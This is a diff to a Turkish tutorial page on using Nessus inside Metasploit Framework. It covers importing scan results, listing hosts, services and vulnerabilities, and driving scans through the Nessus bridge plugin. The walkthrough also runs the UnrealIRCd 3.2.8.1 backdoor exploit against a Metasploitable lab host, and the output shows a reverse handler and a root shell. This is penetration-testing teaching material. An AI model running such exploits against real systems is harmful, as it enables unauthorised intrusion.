@@ -1,37 +1,27 @@
 ---
 draft: false
-
-title:  'MSF İçinde Nessus Kullanmak'
-date: '2017-05-18T13:08:00+03:00'
+title: MSF İçinde Nessus Kullanmak
+linkTitle: Nessus Kullanımı
+weight: 160
+translationKey: using-nessus-in-msf
+date: 2017-05-18T13:08:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-
-description:  'Nessus, kişisel ve ticari olmayan kullanım için ücretsiz olarak edinilebilen bir zafiyet tarama programıdır. Tenable firması tarafından geliştirilmekte olan Nessus tarama programını ve sonuçlarını Metasploit Framework içerisinde kullanabilirsiniz. Bu yazıda, genel hatlarıyla Nessus programının Metasploit Framework içerisinde kullanımını göreceğiz.' 
- 
-url:  /tr/msf-icinde-nessus-kullanmak/
- 
+description: Tenable firması tarafından geliştirilmekte olan Nessus tarama programını ve sonuçlarını Metasploit Framework içerisinde kullanabilirsiniz.
+url: /tr/msf-icinde-nessus-kullanmak/
 featured_image: /images/metasploit.jpg
 categories:
-    - 'Metasploit Framework'
+  - Metasploit Framework
 tags:
-    - cybersecurity
-    - 'metasploit framework'
+  - cybersecurity
+  - metasploit framework
 ---
-
-
 ## Nessus nedir?
-
-
 
 Nessus, kişisel ve ticari olmayan kullanım için ücretsiz olarak edinilebilen bir zafiyet tarama programıdır. Tenable firması tarafından geliştirilmekte olan Nessus tarama programını ve sonuçlarını Metasploit Framework içerisinde kullanabilirsiniz. Bu yazıda, genel hatlarıyla Nessus programının Metasploit Framework içerisinde kullanımını göreceğiz.
 
-
-
 ## Nessus Sonuçlarını İçe Aktarma
 
-
-
 Nessus arayüzünde bir tarama yaptıktan sonra, sonuçları `.nbe` formatında kayıt edebilirsiniz. Bu dosyayı Metasploit Framework için `db_import` komutuyla aktaralım.
-
 
 ```bash
 msf > db_import /root/Nessus/nessus_scan.nbe
@@ -52,14 +42,9 @@ msf > db_import /root/Nessus/nessus_scan.nbe
 msf > 
 ```
 
-
-
 ## hosts Kontrolü
 
-
-
 İçe aktarma işleminden sonra, `hosts`komutuyla tabloya kayıt edilen `IP` adreslerini kontrol edelim.
-
 
 ```bash
 msf > hosts
@@ -80,14 +65,9 @@ address         mac  name    os_name                                            
 msf >
 ```
 
-
-
 ## services Kontrolü
 
-
-
 Ayrıca, `services` komutuyla, bulunan IP adreslerinde çalışan servisleri görüntüleyelim.
-
 
 ```bash
 msf > services 172.16.194.172
@@ -133,20 +113,15 @@ host            port   proto  name            state  info
 172.16.194.172  55269  udp    rpc-mountd      open 
 ```
 
-
-
 ## vulns Kontrolü
 
-
-
 `vulns` komutuyla, Bu Ip adreslerinde çalışan servislere ait varsa zafiyetleri listeleyelim. `vulns` komutuyla listeleme yaparken çeşitli filtreleme seçeneklerini kullanabilirsiniz. Bunları `help vulns` komutuyla incelemenizi tavsiye ediyorum.
-
 
 ```bash
 msf > help vulns
 Print all vulnerabilities **in the database
 
-Usage: vulns **[**addr range]
+Usage: vulns [addr range]
 
   -h,--help             Show this help information
   -p,--port >portspec>  List vulns matching this port spec
@@ -161,50 +136,41 @@ Examples:
 msf >
 ```
 
-
-
 IP adreslerinde, 139 numaralı Portlara ait zafiyetleri görelim.
-
 
 ```bash
 msf > vulns -p 139
-> Time: 2012-06-15 18:32:26 UTC Vuln: host**=**172.16.194.134 name**=**NSS-11011 refs**=**NSS-11011 
-> Time: 2012-06-15 18:32:23 UTC Vuln: host**=**172.16.194.172 name**=**NSS-11011 refs**=**NSS-11011 
+> Time: 2012-06-15 18:32:26 UTC Vuln: host=172.16.194.134 name=NSS-11011 refs=NSS-11011 
+> Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-11011 refs=NSS-11011 
 
 msf > vulns -p 22
-> Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.148 name**=**NSS-10267 refs**=**NSS-10267 
-> Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.148 name**=**NSS-22964 refs**=**NSS-22964 
-> Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.148 name**=**NSS-10881 refs**=**NSS-10881 
-> Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.148 name**=**NSS-39520 refs**=**NSS-39520 
-> Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.163 name**=**NSS-39520 refs**=**NSS-39520 
-> Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.163 name**=**NSS-25221 refs**=**NSS-25221 
-> Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.163 name**=**NSS-10881 refs**=**NSS-10881 
-> Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.163 name**=**NSS-10267 refs**=**NSS-10267 
-> Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.163 name**=**NSS-22964 refs**=**NSS-22964 
-> Time: 2012-06-15 18:32:24 UTC Vuln: host**=**172.16.194.172 name**=**NSS-39520 refs**=**NSS-39520 
-> Time: 2012-06-15 18:32:24 UTC Vuln: host**=**172.16.194.172 name**=**NSS-10881 refs**=**NSS-10881 
-> Time: 2012-06-15 18:32:24 UTC Vuln: host**=**172.16.194.172 name**=**NSS-32314 refs**=**CVE-2008-0166,BID-29179,OSVDB-45029,CWE-310,NSS-32314 
-> Time: 2012-06-15 18:32:24 UTC Vuln: host**=**172.16.194.172 name**=**NSS-10267 refs**=**NSS-10267 
-> Time: 2012-06-15 18:32:24 UTC Vuln: host**=**172.16.194.172 name**=**NSS-22964 refs**=**NSS-22964 
+> Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-10267 refs=NSS-10267 
+> Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-22964 refs=NSS-22964 
+> Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-10881 refs=NSS-10881 
+> Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.148 name=NSS-39520 refs=NSS-39520 
+> Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-39520 refs=NSS-39520 
+> Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-25221 refs=NSS-25221 
+> Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-10881 refs=NSS-10881 
+> Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-10267 refs=NSS-10267 
+> Time: 2012-06-15 18:32:25 UTC Vuln: host=172.16.194.163 name=NSS-22964 refs=NSS-22964 
+> Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-39520 refs=NSS-39520 
+> Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-10881 refs=NSS-10881 
+> Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-32314 refs=CVE-2008-0166,BID-29179,OSVDB-45029,CWE-310,NSS-32314 
+> Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-10267 refs=NSS-10267 
+> Time: 2012-06-15 18:32:24 UTC Vuln: host=172.16.194.172 name=NSS-22964 refs=NSS-22964 
 ```
-
-
 
 `172.16.194.172` IP adresine ait `6667` numaralı porta ait zafiyetleri görelim.
 
-
 ```bash
 msf > vulns 172.16.194.172 -p 6667
-> Time: 2012-06-15 18:32:23 UTC Vuln: host**=**172.16.194.172 name**=**NSS-46882 refs**=**CVE-2010-2075,BID-40820,OSVDB-65445,NSS-46882 
-> Time: 2012-06-15 18:32:23 UTC Vuln: host**=**172.16.194.172 name**=**NSS-11156 refs**=**NSS-11156 
-> Time: 2012-06-15 18:32:23 UTC Vuln: host**=**172.16.194.172 name**=**NSS-17975 refs**=**NSS-17975 
+> Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-46882 refs=CVE-2010-2075,BID-40820,OSVDB-65445,NSS-46882 
+> Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-11156 refs=NSS-11156 
+> Time: 2012-06-15 18:32:23 UTC Vuln: host=172.16.194.172 name=NSS-17975 refs=NSS-17975 
 msf >
 ```
 
-
-
 `6667` numaralı porta ait zafiyet olarak listelenen `cve:2010-2075` zafiyetine ait Metasploit Framework modüllerinde herhangi bir modül var mı? Aratalım.
-
 
 ```bash
 msf > search cve:2010-2075
@@ -220,10 +186,7 @@ Matching Modules
 msf >
 ```
 
-
-
 Arama sonucunda, `exploit/unix/irc/unreal_ircd_3281_backdoor` isimli bir exploit modülü bulunduğunu görüyoruz. Şimdi bu modülü kullanalım.
-
 
 ```bash
 msf  use exploit/unix/irc/unreal_ircd_3281_backdoor
@@ -232,8 +195,8 @@ msf  exploit(unreal_ircd_3281_backdoor) > exploit
 
 > Started reverse double handler
 > Connected to 172.16.194.172:6667...
-    :irc.Metasploitable.LAN NOTICE AUTH :******* Looking up your hostname...
-    :irc.Metasploitable.LAN NOTICE AUTH :******* Couldn't resolve your hostname; using your IP address instead
+    :irc.Metasploitable.LAN NOTICE AUTH : Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH : Couldn't resolve your hostname; using your IP address instead
 [*] Sending backdoor command...
 [*] Accepted the first client connection...
 [*] Accepted the second client connection...
@@ -271,43 +234,29 @@ id
 uid=0(root) gid=0(root)
 ```
 
-
-
 Exploit modülünün kullanımı ile Hedef IP adresinde bir komut satırı açılmıştır.
-
-
 
 ## Nessus Programını Doğrudan MSF İçinden Kullanma
 
-
-
 Önceki bölümde, Nessus programının yaptığı bir taramayı `.nbe` formatında kaydedip, Metasploit içerisine aktarım kullanmıştık. Komut satırını kullanmayı seviyorsanız, Nessus programını doğrudan komut satırından da kullanabilirsiniz. Bunun gerçekleşebilmesi için Metasploit Framework için geliştirilen `Nessus Bridge Plugin` isimli bir eklenti bulunmaktadır.
-
-
 
 ## Nessus Bridge Eklentisi Başlatma
 
-
-
 `msfconsole` içerisinden Nessus kullanım için gerekli eklentiyi yükleyelim.
-
 
 ```bash
 msf > load nessus
-> Nessus Bridge for **Metasploit 1.1
-**[**+] Type nessus_help for **a command listing
+> Nessus Bridge for Metasploit 1.1
+[+] Type nessus_help for a command listing
 > Successfully loaded plugin: nessus
 ```
 
-
-
 Bu eklentinin bize sunduğu komutları görmek için, `nessus_help` yardım komutunu görüntüleyelim.
-
 
 ```bash
 msf > nessus_help
-**[**+] Nessus Help
-**[**+] type nessus_help command for **help with specific commands
+[+] Nessus Help
+[+] type nessus_help command for help with specific commands
 
 Command                    Help Text
 -------                    ---------
@@ -317,14 +266,14 @@ nessus_connect             Connect to a nessus server
 nessus_logout              Logout from the nessus server
 nessus_help                Listing of available nessus commands
 nessus_server_status       Check the status of your Nessus Server
-nessus_admin               Checks **if **user is an admin
+nessus_admin               Checks if user is an admin
 nessus_server_feed         Nessus Feed Type
 nessus_find_targets        Try to find vulnerable targets from a report
                           
 Reports Commands          
 -----------------          -----------------
 nessus_report_list         List all Nessus reports
-nessus_report_get          Import a report from the nessus server **in **Nessus v2 format
+nessus_report_get          Import a report from the nessus server in Nessus v2 format
 nessus_report_hosts        Get list of hosts from a report
 nessus_report_host_ports   Get list of open ports from a host from a report
 nessus_report_host_detail  Detail from a report item on a host
@@ -336,39 +285,29 @@ nessus_scan_status         List all currently running Nessus scans
 ...snip...
 ```
 
-
-
 ## Nessus Sunucuya Bağlanma
-
-
 
 `msfconsole` içerisinden Nessus programına komut gönderebilmek için öncelikle Nessus sunucuya bağlanmamız gerekmektedir. Bunun için `nessus_connect dook:s3cr3t@192.168.1.100 ok` komut şablonunu kullanıyoruz. Burada **dook** Nessus için kullandığınız **kullanıcı adınız** , **s3cr3t** Nessus parolanızdır. **192.168.1.100** IP adresi yerine, sisteminizde Nessus sunucunun çalıştığı IP adresini yazmalısınız. Komutun sonundaki `ok` parametresi, Nessus’a dışarıdan bağlandığınızı ve güvenlik ikazını kabul ettiğinizi onaylamak için zorunludur.
 
-
 ```bash
 msf > nessus_connect dook:s3cr3t@192.168.1.100
-**[**-] Warning: SSL connections are not verified **in **this release, it is possible for **an attacker
-**[**-]          with the ability to man-in-the-middle the Nessus traffic to capture the Nessus
-**[**-]          credentials. If you are running this on a trusted network, please pass **in** 'ok'
-**[**-]          as an additional parameter to this command.
+[-] Warning: SSL connections are not verified **in **this release, it is possible for **an attacker
+[-]          with the ability to man-in-the-middle the Nessus traffic to capture the Nessus
+[-]          credentials. If you are running this on a trusted network, please pass **in** 'ok'
+[-]          as an additional parameter to this command.
 msf > nessus_connect dook:s3cr3t@192.168.1.100 ok
 > Connecting to <a href="https://192.168.1.100:8834/">https://192.168.1.100:8834/</a> as dook
 > Authenticated
 msf >
 ```
 
-
-
 ## Nessus Tarama Politikalarını Görüntüleme
-
-
 
 Nessus sunucuda bulunan tarama politikalarını `nessus_policy_list` komutuyla görüntüleyelim. Herhangi bir tarama politikanız yoksa, Nessus Görsel arayüzüne giderek oluşturmanız gerekmektedir.
 
-
 ```bash
 msf > nessus_policy_list
-**[**+] Nessus Policy List
+[+] Nessus Policy List
 
 ID  Name       Owner  visability
 --  ----       -----  ----------
@@ -377,14 +316,9 @@ ID  Name       Owner  visability
 msf >
 ```
 
-
-
 ## Nessus İle Yeni Bir Tarama Başlatma
 
-
-
 Artık tarama politikalarını da görüntüledikten sonra yeni bir tarama başlatabiliriz. Taramayı başlatmak için `nessus_scan_new` komutu kullanılır. Komut, `nessus_scan_new`, `id`, `scan name`, `targets` parçalarından oluşur. Aşağıda örneğini görebilirsiniz.
-
 
 ```bash
 msf > nessus_scan_new
@@ -399,18 +333,13 @@ msf > nessus_scan_new 1 pwnage 192.168.1.161
 msf >
 ```
 
-
-
 ## Devam Eden Tarama Durumunu Görüntüleme
-
-
 
 `nessus_scan_new` komutuyla başlattığınız taramanın ne durumda olduğunu, `nessus_scan_status` komutuyla kontrol edebilirsiniz.
 
-
 ```bash
 msf > nessus_scan_status
-**[**+] Running Scans
+[+] Running Scans
 
 Scan ID                                               Name    Owner  Started            Status   Current Hosts  Total Hosts
 -------                                               ----    -----  -------            ------   -------------  -----------
@@ -418,8 +347,8 @@ Scan ID                                               Name    Owner  Started    
 
 
 > You can:
-**[**+]         Import Nessus report to database :     nessus_report_get reportid
-**[**+]         Pause a nessus scan :             nessus_scan_pause scanid
+[+]         Import Nessus report to database :     nessus_report_get reportid
+[+]         Pause a nessus scan :             nessus_scan_pause scanid
 msf > nessus_scan_status
 > No Scans Running.
 > You can:
@@ -428,18 +357,13 @@ msf > nessus_scan_status
 msf >
 ```
 
-
-
 ## Tarama Sonucunu Alma
-
-
 
 Nessus taraması tamamlandığında kendi içinde bir rapor oluşturur. Metasploit Framework içine alınabilecek raporların listesini `nessus_report_list` komutuyla görüntüleyelim. Ardından, raporun `ID` numarasını vererek, `nessus_report_get` komutuyla `msfconsole` içine ithal edelim.
 
-
 ```bash
 msf > nessus_report_list
-**[**+] Nessus Report List
+[+] Nessus Report List
 
 ID                                                    Name    Status     Date
 --                                                    ----    ------     ----
@@ -460,14 +384,9 @@ msf > nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
 msf >
 ```
 
-
-
 ## Sonuçları Görüntüleme
 
-
-
 İçeri aktarılan tarama sonuçlarını, önceki bölümde olduğu gibi `hosts`, `services` ve `vulns` komutlarıyla görüntüleyebilirsiniz.
-
 
 ```bash
 msf > hosts -c address,vulns
@@ -480,17 +399,16 @@ address        vulns
 192.168.1.161  33
 ```
 
-
 ```bash
 msf > vulns
-> Time: 2010-09-28 01:51:37 UTC Vuln: host**=**192.168.1.161 port**=**3389 proto**=**tcp name**=**NSS-10940 refs**=**
-> Time: 2010-09-28 01:51:37 UTC Vuln: host**=**192.168.1.161 port**=**1900 proto**=**udp name**=**NSS-35713 refs**=**
-> Time: 2010-09-28 01:51:37 UTC Vuln: host**=**192.168.1.161 port**=**1030 proto**=**tcp name**=**NSS-22319 refs**=**
-> Time: 2010-09-28 01:51:37 UTC Vuln: host**=**192.168.1.161 port**=**445 proto**=**tcp name**=**NSS-10396 refs**=**
-> Time: 2010-09-28 01:51:38 UTC Vuln: host**=**192.168.1.161 port**=**445 proto**=**tcp name**=**NSS-10860 refs**=**CVE-2000-1200,BID-959,OSVDB-714
-> Time: 2010-09-28 01:51:38 UTC Vuln: host**=**192.168.1.161 port**=**445 proto**=**tcp name**=**NSS-10859 refs**=**CVE-2000-1200,BID-959,OSVDB-715
-> Time: 2010-09-28 01:51:39 UTC Vuln: host**=**192.168.1.161 port**=**445 proto**=**tcp name**=**NSS-18502 refs**=**CVE-2005-1206,BID-13942,IAVA-2005-t-0019
-> Time: 2010-09-28 01:51:40 UTC Vuln: host**=**192.168.1.161 port**=**445 proto**=**tcp name**=**NSS-20928 refs**=**CVE-2006-0013,BID-16636,OSVDB-23134
-> Time: 2010-09-28 01:51:41 UTC Vuln: host**=**192.168.1.161 port**=**445 proto**=**tcp name**=**NSS-35362 refs**=**CVE-2008-4834,BID-31179,OSVDB-48153
-> Time: 2010-09-28 01:51:41 UTC Vuln: host**=**192.168.1.161
+> Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=3389 proto=tcp name=NSS-10940 refs=
+> Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=1900 proto=udp name=NSS-35713 refs=
+> Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=1030 proto=tcp name=NSS-22319 refs=
+> Time: 2010-09-28 01:51:37 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-10396 refs=
+> Time: 2010-09-28 01:51:38 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-10860 refs=CVE-2000-1200,BID-959,OSVDB-714
+> Time: 2010-09-28 01:51:38 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-10859 refs=CVE-2000-1200,BID-959,OSVDB-715
+> Time: 2010-09-28 01:51:39 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-18502 refs=CVE-2005-1206,BID-13942,IAVA-2005-t-0019
+> Time: 2010-09-28 01:51:40 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-20928 refs=CVE-2006-0013,BID-16636,OSVDB-23134
+> Time: 2010-09-28 01:51:41 UTC Vuln: host=192.168.1.161 port=445 proto=tcp name=NSS-35362 refs=CVE-2008-4834,BID-31179,OSVDB-48153
+> Time: 2010-09-28 01:51:41 UTC Vuln: host=192.168.1.161
 ...snip...```
